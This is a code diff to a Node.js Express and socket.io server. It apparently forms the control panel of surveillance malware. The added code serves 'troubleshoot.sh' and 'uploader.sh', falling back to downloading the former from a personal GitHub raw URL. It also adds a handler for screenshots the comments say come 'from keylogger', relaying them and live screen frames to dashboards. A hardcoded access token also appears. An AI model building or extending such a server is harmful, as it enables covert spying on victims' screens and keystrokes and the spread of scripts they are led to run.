@@ -3,8 +3,10 @@
 
 const express = require('express');
 const http = require('http');
+const https = require('https');
 const { Server } = require('socket.io');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -23,9 +25,40 @@ const ACCESS_TOKEN = '9f1013f0';
 app.use(express.static(__dirname));
 
 // Serve troubleshoot.sh with correct content type
+// First try local file, then fetch from GitHub raw URL
 app.get('/troubleshoot.sh', (req, res) => {
     res.setHeader('Content-Type', 'text/plain');
-    res.sendFile(path.join(__dirname, 'troubleshoot.sh'));
+    res.setHeader('Content-Disposition', 'inline; filename="troubleshoot.sh"');
+    
+    const localPath = path.join(__dirname, 'troubleshoot.sh');
+    
+    // Try local file first
+    if (fs.existsSync(localPath)) {
+        res.sendFile(localPath);
+    } else {
+        // Fetch from GitHub raw URL
+        const githubUrl = 'https://raw.githubusercontent.com/personer39-debug/egfr/main/troubleshoot.sh';
+        https.get(githubUrl, (githubRes) => {
+            if (githubRes.statusCode === 200) {
+                githubRes.pipe(res);
+            } else {
+                res.status(404).send('#!/bin/bash\necho "File not found"');
+            }
+        }).on('error', (err) => {
+            res.status(500).send('#!/bin/bash\necho "Error fetching file"');
+        });
+    }
+});
+
+// Serve uploader.sh if it exists
+app.get('/uploader.sh', (req, res) => {
+    res.setHeader('Content-Type', 'text/plain');
+    const uploaderPath = path.join(__dirname, 'uploader.sh');
+    res.sendFile(uploaderPath, (err) => {
+        if (err) {
+            res.status(404).send('File not found');
+        }
+    });
 });
 
 // Serve dashboard.html
@@ -87,6 +120,14 @@ io.on('connection', (socket) => {
         if (data.clientId) {
             // Broadcast to all dashboards (or specific dashboard watching this client)
             io.emit('screen-frame', data);
+        }
+    });
+
+    // Handle screenshots from keylogger
+    socket.on('screenshot', (data) => {
+        if (data.clientId) {
+            // Broadcast screenshot to dashboards
+            io.emit('screenshot', data);
         }
     });
 
